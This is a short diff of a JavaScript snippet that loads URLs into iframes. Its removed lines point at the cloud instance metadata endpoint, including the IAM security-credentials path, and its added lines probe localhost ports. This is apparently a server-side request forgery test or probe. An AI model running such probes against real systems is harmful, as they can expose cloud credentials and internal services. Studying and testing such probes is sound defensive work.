@@ -9,8 +9,8 @@ createFrame = function(url)
   i.appendChild(document.createElement('hr'));
 }
 
-createFrame('https://169.254.169.254/latest/meta-data/');
-createFrame('https://169.254.169.254/latest/meta-data/iam/security-credentials/');
-createFrame('https://localhost:3000/');
+createFrame('http://localhost:3000/');
+createFrame('http://localhost/');
+createFrame('https://localhost/');
 
 document.body.appendChild(i);
